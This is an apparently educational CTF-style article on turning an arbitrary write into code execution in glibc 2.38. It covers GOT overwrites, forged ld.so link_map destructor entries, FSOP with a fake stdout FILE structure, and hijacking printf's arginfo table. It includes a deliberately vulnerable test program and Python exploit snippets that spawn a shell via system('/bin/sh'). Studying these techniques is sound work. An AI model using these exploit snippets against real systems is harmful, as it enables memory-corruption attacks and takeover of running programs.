# Code execution with a write primitive on last libc.



## 1- Introduction

This article will try to summarize the various ways to obtain code execution on the last libc with a write primitive.

Of course it is not limited to heap exploitation challenges, it could be any type of controlled write primitive.

We will target libc or ld indifferently,  as ld.so is included in libc source code.

At the time of writing (October 2023.),  last libc version is 2.38, so I will use this version for all my experiments.

It will be updated as new versions of libc will appear.

The goal of this article is more practical than theoretical. I will share here infos, code example, python macros, anything that could be directly used in exploits.

Since libc 2.34, all the classic memory allocation hooks that many **pwners** used in libc have been removed. Actually , there are still present in libc, but are no more used. as you can see in this announce:

![announce](./pics/announce.png)

so we will focus of what is still working.

In recent libc, many function pointers inside libc are mangled: they are xored with a random value, that is stored in `tls-storage`, and they are also shifted.

To create a mangled function pointer, you need first to leak this random value to be able to forge a function pointer.

So it requires one more leak , that complicates exploitation.

`tls-storage` is mapped by  `ld.so` during loading of executable required libs, and is most of the time mapped just before `libc`. But depending on the number and order of loaded libraries, could be mapped elsewhere sometimes.

`tls-storage`, which is pointed by `fs`segment register on x86_64, contains the random value used to create mangled function pointer, it contains also the `canary`used to protect stack from buffer overflow, and other variables.

------

### C program template for our experiments

Here is a small C program that we will use for our experiments:

```c
// gcc -g -o prog prog.c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

static void setup() {
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);
}

uint64_t getint(char *msg)
{
char buf[64];

	printf("%s", msg);
	fgets(buf,64,stdin);
	return strtoul(buf,0,10);
}

int main()
{
uint64_t choice;
uint64_t addr;
uint64_t size;

	setup();
	printf("libc stdout leak: %p\n", stdout);
	while(1)
	{
		puts("1. write data to addr");
		puts("2. exit");
		choice = getint("choice> ");
		if (choice == 2)
			break;
		else if (choice == 1)
		{
			addr = getint("address> ");
			size = getint("size> ");
			printf("data> ");
			fread((void *)addr,size,1,stdin);
		}
		else
			continue;
	}
	return(0);
}
```

This program will be enough, to experiments writing in various part of `libc`, or `ld.so` memory.

I provide also a version of ld and libc.so with full debug symbols.

The program first print a leak of `stdout` libc address, in your real exploit, it's up to you to get a libc leak of course  😋

If you don't have a leak in your exploit, you should read how to use a partial write over `stdout` structure for leaking a libc address before starting:   [Using stdout as a read primitive](https://github.com/nobodyisnobody/docs/tree/main/using.stdout.as.a.read.primitive)

Last but not least, if you plan to experiment with the provided `prog.c` and debugging,

I hotly recommend you to use the fork of `gef ` by **bata24**,  which is so great for debugging:

[https://github.com/bata24/gef](https://github.com/bata24/gef)

it adds many new commands for examining data structures (like tls-storage, got entries, etc , etc..)

It is such a great gdb extension that you should not work with something else anymore .. believe me..

------

## 1 - Targetting libc GOT entries.

If you check `libc.so.6` in most linux distro you will see that most of them use protection `Partial Relro`

```sh
checksec libc.so.6
[*] './libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

that means that `GOT` entries are writable, and so,  are a perfect target for code execution as they are not mangled.

let's have a look at them on `bata24 gef`for  `gdb`, for that, look at the `libc.so.6` file used by the `prog` binary

and do under gdb:

```sh
got -f /fullpath/libc.so.6
```

you have to indicate full path of libc used, or by default got will dump only main binary `GOT` entries.

let's have a look to a part of these got entries (as the list is a bit long):

![got1](./pics/got1.png)

In this screenshot, the `GOT` start at RW libc zone `0x7fe3d73fe000`

you can see that most entries are strings functions, optimized for the cpu current architecture, (maybe that's why they keep the GOT half relro, to update strings function at runtime...)

These functions in `GOT` are called by many other libc functions. To know which `GOT` entry you should target , you can for example put breakpoint in the `GOT` entries, then when the breakpoint is reached see stack backtrace to find which libc function call this `GOT` entry, or you can search in glibc source code too, or look at libc disassembly with objdump..

For example, libc `puts()` function is calling `__strlen_avx2` as you see:

![strlen](./pics/strlen.png)

then you can check when reaching the breakpoint the state of registers, to see if a onegadget could pass for example.

if your gadget does not pass in a `GOT` entry, looks at this write-up, how to chain two gadgets for modifying registers to make the `onegadget` works:  [https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc#code-execution-inferno]( https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc#code-execution-inferno)

------

## 2 - Targetting ld.so link_map structure.

> The prerequisite for this way to achieve code execution, is that the program must exits via `return`, or via `exit()` libc function.
>
> In the two cases, libc will execute `__run_exit_handlers()` function that will call any destructors function registered (also called `dtors`), and will cleanup various things before exiting.
>

If the program exits via `_exit()` function  (which name starts with an underscore), the `exit` syscall will be directly called, and the exit handlers will not be executed. You can set a breakpoint in `__run_exit_handlers()`  to verify that it is executed at exit, in case you doubt..

The code changed a bit libc-2.38 , the `__run_exit_handlers()` will call `_dl_fini()` which is defined in the libc source file `elf/dl-fini.c` that will parse each `link_map`, and will call `_dl_call_fini` defined in `elf/dl-call_fini.c` that will do the same than in previous versions

here is the code responsible for calling the registered destructors functions:

```c
_dl_call_fini (void *closure_map)
{
  struct link_map *map = closure_map;

  /* When debugging print a message first.  */
  if (__glibc_unlikely (GLRO(dl_debug_mask) & DL_DEBUG_IMPCALLS))
    _dl_debug_printf ("\ncalling fini: %s [%lu]\n\n", map->l_name, map->l_ns);

  /* Make sure nothing happens if we are called twice.  */
  map->l_init_called = 0;

  ElfW(Dyn) *fini_array = map->l_info[DT_FINI_ARRAY];
  if (fini_array != NULL)
    {
      ElfW(Addr) *array = (ElfW(Addr) *) (map->l_addr
                                          + fini_array->d_un.d_ptr);
      size_t sz = (map->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
                   / sizeof (ElfW(Addr)));

      while (sz-- > 0)
        ((fini_t) array[sz]) ();
    }

  /* Next try the old-style destructor.  */
  ElfW(Dyn) *fini = map->l_info[DT_FINI];
  if (fini != NULL)
    DL_CALL_DT_FINI (map, ((void *) map->l_addr + fini->d_un.d_ptr));
}
```

`link_map` are a linked list structures, that are parsed one by one by `dl_fini`, each `l_next`entry points to the next `link_map`structure. There is one `link_map` structure for each file mapped by ld.so, in our `prog` binary for example, there are four `link_map`, one for main binary, one for `linux-vdso.so.1`,  one for `./libc.so.6`, and one for `./ld-linux-x86-64.so.2`

So there could be more `link_map` if ld.so load other libraries.

for each `link_map` `_dl_call_fini()`function, check if there if `l_info[DT_FINI_ARRAY]` fini array is defined

> for libc-2.38,  DT_FINI_ARRAY l_info index is 0x1a, DT_FINI_ARRAYSZ l_info index is 0x1c

`l_info[DT_FINI_ARRAY] ` point to a `ElfW(Dyn)`structure declared like this (in `elf/elf.h`):t

```c
typedef struct
{
  Elf64_Sxword  d_tag;                  /* Dynamic entry type */
  union
    {
      Elf64_Xword d_val;                /* Integer value */
      Elf64_Addr d_ptr;                 /* Address value */
    } d_un;
} Elf64_Dyn;
```

if `l_info[DT_FINI_ARRAY]` fini array is defined,  array ptr is calculated like this

```c
 ElfW(Addr) *array = (ElfW(Addr) *) (map->l_addr + fini_array->d_un.d_ptr);
```

we can see `array` is calculated by adding `map->l_addr` which is the base address mapping of the library or binary, 

that is added with `fini_array->d_un.d_ptr` entry

the entry `l->l_info[DT_FINI_ARRAYSZ]` point to another `d_un` structure that contains the length in byte of `l_info[DT_FINI_ARRAY]`

```c
size_t sz = (map->l_info[DT_FINI_ARRAYSZ]->d_un.d_val / sizeof (ElfW(Addr)));
```

then each entries pointed by array are called one by one

```c
while (sz-- > 0)
        ((fini_t) array[sz]) ();
```

ouf ! 😅

so how to get code execution with this mechanism.

Well, there are different ways to do it..

You can target `map->l_addr` , which is the base address mapping of binary or library, and add a value to it..

when `array`will be calculated by adding `map->l_addr` to `fini_array->d_un.d_ptr`, that will shift calculated array further in memory, ideally to a zone where you have forged a fake `fini_array` containing pointers to the functions or gadgets that you want to execute.

another option is to overwrite `l_info[DT_FINI_ARRAY]` and `l_info[DT_FINI_ARRAYSZ]` entries (which are more or less consecutive in memory) , to make them points to a forged `Elf64_Dyn` structure that will make again `array` points to a memory zone you controlled.. like I did in this write-up for example (https://github.com/nobodyisnobody/write-ups/tree/main/DanteCTF.2023/pwn/Sentence.To.Hell)

> By default gcc seems to create an fini_array, in the main binary, even if there are no destructors defined.
>
> The l_info[DT_FINI_ARRAY] points to a read-only zone in the binary that cannot be modified.
>
> But you can shift `map->l_addr` to make it points further in memory, in the `.bss` for example, where you can create again a forged `fini_array` to alter code execution to the functions or gadgets you want.
>
> ld.so leave a pointer on the stack that points to the binary `link_map` in ld.so, this if often a target in format string challenges to get a code execution at exits.. (see here for example:  https://activities.tjhsst.edu/csc/writeups/angstromctf-2021-wallstreet)

There is also a second mechanism via `l_info[DT_FINI]` `link_map` entry as you can see in last part of `_dl_call_fini`

```c
/* Next try the old-style destructor.  */
  ElfW(Dyn) *fini = map->l_info[DT_FINI];
  if (fini != NULL)
    DL_CALL_DT_FINI (map, ((void *) map->l_addr + fini->d_un.d_ptr));
}
```

which handle old-style destructors, this is not an array in this case, but only one function that will be called.

It's calculation is done in the same way of "new-style" destructors, by adding `map->l_addr` the base mapping address , with the `Elfw(Dyn)`structure `d_un_d_ptr` entry (structure pointed by the entry `l_info[DT_FINI]`)

So as for previous mechanism, you can write to `l_info[DT_FINI]`  to makes it points to a forged `EflW(Dyn)` structure in a memory zone you control too.

that's even a bit simpler than "new-style" destructors as you have to forge only one structure.

**exemple:** do you like it tricky?

so let's give an example of getting code execution via overwriting `l_info[DT_FINI]` with a forged `Elfw(Dyn)`structure, and by controlling $rdi.

```python
# stdout read primitive
def readmem(stdout_addr, addr, size, returned=0):
  temp = p64(0xfbad1887) + p64(0)*3 + p64(addr) + p64(addr + size)*3 + p64(addr + size +1)
  write(stdout_addr, temp)
  if returned:
    return p.read(size)

map = u64(readmem(libc.sym['_IO_2_1_stdout_'], libc.address+0x1fdff0, 16, 1)[0:8])
print('link_map address = '+hex(map))

target = map+0xa8	# DT_FINI entry
write(map,p64(u64('/bin/sh\x00')))		# overwrite map->l_addr with '/bin/sh' string
payload = p64(target)+p64(0x10000000000000000+(libc.sym['system']-u64(b'/bin/sh\x00')))
write(target, payload)

```

this small exemple leak libc `link_map` address by using stdout to leak it.

then overwrite `map->l_addr` with string '/bin/sh

then write a forged `Elfw(Dyn)` structure just next `DT_FINI` entry, with the offset of `system()` function minus '/bin/sh' string, the `map->l_addr + fini->d_un.d_ptr` calculation will give us  ̀system()` address.

the result is a clean `system('/bin/sh')`

you can find full exemple in file:  `exp_dt_fini.py`  (I leaved various debugging option to follow the code execution, especially a breakpoint at `*_dl_call_fini+94`)

> another option could be to leave libc base address in `map->l_addr` and put a onegadget offset address in `map->l_info[DT_FINI]->d_un.d_ptr` forged structure,  the `map->l_addr + fini->d_un.d_ptr` calculation will give us right address of onegadget (but I find none that would pass), could work with a gadget too... let be creative !

------

## 3 - the FSOP way, targetting stdout

well...believe it , or believe it not (magnifique franglais)

were are in 2023, and FSOP still works great for code execution by writing in libc. 🤷

There are still many different paths to achieve it, and this article is supposed to summarize, not to be exhaustive,

so I will just give a clean, simple example for getting a code execution with just a libc leak on `libc 2.38` of course.

If you want to explore in details the FSOP way, use the force, and explore these wonderful write-ups on the subject by **Roderick** (in chinese, use google translate), **Kylebot**, and **Nifitic**.. when you will have digest them..you will know a lot more about FSOP !

+ [Roderick Chan - house of apple 1](https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/)
+ [Roderick Chan - house of apple 2](https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/)
+ [Roderick Chan - house of apple 3](https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-3/)
+ [Kyle bot - angry-FSOP - using angr to explore FSOP path](https://blog.kylebot.net/2022/10/22/angry-FSROP/)  
+ [Nifitic - Deep dive into FSOP](https://niftic.ca/posts/fsop/)

so, here is a simple example how to construct the fake FILE structure, the full exploit is in file: `exp_fsop.py`,  I have leaved debugging options in it , if you want to explore by yourself:

```python
# some constants
stdout_lock = libc.address + 0x2008f0   # _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x00000000001676a0 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
# write the fake Filestructure to stdout
write(libc.sym['_IO_2_1_stdout_'], bytes(fake))
# enjoy your shell
```

I used a simple gadget that increase `rdi` register and jump to `rcx` which contains system.

this is the same path via `_IO_wfile_underflow` that we used in `byor`challenge from **Hack.lu** 2022 edition, which is described here --> [https://github.com/nobodyisnobody/write-ups/tree/main/Hack.lu.CTF.2022/pwn/byor](https://github.com/nobodyisnobody/write-ups/tree/main/Hack.lu.CTF.2022/pwn/byor)

------

## 4 - Code execution via fake custom conversion specifiers 

#### (`__printf_function_table` & `__printf_arginfo_table`)

libc permits to register custom conversion specifiers for `printf` as explained here: [https://www.gnu.org/software/libc/manual/html_node/Customizing-Printf.html](https://www.gnu.org/software/libc/manual/html_node/Customizing-Printf.html)

That means that the management of a chosen conversion specifier (for example `%s`,  or `%d`, or any specifier you want) will be made by a chosen function, that will be called when `printf` use that specifier.

> Prerequisites:
>
> the program you are exploiting must use `printf` and a conversion specifier

by overwriting a non NULL value to `__printf_function_table` and writing an entry in the table pointed by `__printf_arginfo_table` with a function address, that function will be called for managing the

These function pointers are not mangled of course.

the code that calls the function is in libc source file `stdio-common/printf-parsemb.c` (line 368)

```c
/* Get the format specification.  */
  spec->info.spec = (wchar_t) *format++;
  spec->size = -1;
  if (__builtin_expect (__printf_function_table == NULL, 1)
      || spec->info.spec > UCHAR_MAX
      || __printf_arginfo_table[spec->info.spec] == NULL
      /* We don't try to get the types for all arguments if the format
         uses more than one.  The normal case is covered though.  If
         the call returns -1 we continue with the normal specifiers.  */
      || (int) (spec->ndata_args = (*__printf_arginfo_table[spec->info.spec])
                                   (&spec->info, 1, &spec->data_arg_type,
                                    &spec->size)) < 0)
```

you can see that `spec->info.spec` is the current conversion specifier char.

`__printf_function_table` must be non NULL

and function in `__print_arginfo_table[]` is called like this: 

```c
__printf_arginfo_table[spec->info.spec])(&spec->info, 1, &spec->data_arg_type, &spec->size)
```

so `__printf_arginfo_table`  must point to a forged table,   we will create one just at `__printf_arginfo_table` as there are a lot of NULL vars around,

and for example if we want to replace function for '%s' specifier, which is ascii 0x73, it's very simple:

```python
write(libc.sym['__printf_arginfo_table'], p64(libc.sym['__printf_arginfo_table']))
write(libc.sym['__printf_arginfo_table']+0x73*8, p64(onegadget))	# 0x73 is 's'
# activate it
write(libc.sym['__printf_function_table'], p64(1) )
```

here we write a onegadget as the function handler for '%s'  that will be called when a `printf("%s")` is used.

you can find an example of exploit in `exp_printf_table.py`  file.

